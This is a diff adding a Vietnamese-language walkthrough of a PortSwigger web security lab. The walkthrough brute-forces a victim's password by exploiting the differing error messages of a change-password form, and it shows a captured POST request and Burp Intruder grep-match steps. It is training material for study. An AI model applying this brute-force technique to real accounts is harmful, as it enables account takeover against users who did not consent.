@@ -349,6 +349,34 @@ https://exploit-0aa100f8049146298038523301630081.exploit-server.net/forgot-passw
 - Vào **log** trong **Exploit Server** vào truy cập vào `orgot-password?temp-forgot-password-token=carlos-token` để thay đổi mật khẩu
 - Login bằng tài khoản của `carlos`
 
+### Lab: Password brute-force via password change
+#### Analysis
+- Login bằng account `wiener`
+- Thay đổi password, có 4 trường hợp xảy ra:
+    - **Current password is incorrect:** `username=incorrect&current-password=a&new-password-1=b&new-password-2=c`
+    - **New passwords do not match:** `username=wiener&current-password=a&new-password-1=b&new-password-2=c`
+    - **Out:** `username=incorrect&current-password=a&new-password-1=b&new-password-2=b`
+    - **Success:** `username=wiener&current-password=a&new-password-1=b&new-password-2=b`
+- Thay đổi tên username bằng `carlos` => giống như trên
+- Lợi dụng các tín hiệu này để brute-force: `new-password-1` và `new-password-2` không giống nhau, nếu password đúng ta nhận được `New passwords do not match`, ngược lại ta nhận được **Current password is incorrect**
+
+#### Exploit
+- Gửi request change password tới **Burp Intruder**
+
+```http
+POST /my-account/change-password HTTP/2
+Host: 0a97005704586756818a2ac6002900ff.web-security-academy.net
+Cookie: session=lkkrq5AzgBCDdQoOzTtKOivyDkcRCjTt; session=UR6Nc5K3HwyeLsBdA33cVq0iyRdWkgOE
+...
+username=carlos&current-password=a&new-password-1=b&new-password-2=c
+```
+- Add tại `a`
+- Chọn mode **Snifer attack**
+- Paste list password được cấp
+- Thêm vào **Grep - match:** `New passwords do not match`
+- Start attack, kiểm tra xem cái nào có `New passwords do not match` chính là request chứa password thật
+- Login
+
 ## Prevent
 ---
 ### 1. Protect User Credentials
@@ -375,3 +403,4 @@ MFA là cách hiệu quả để tăng bảo mật. Không nên chỉ dùng xác
 
 ---
 Goodluck! 🍀🍀🍀 
+
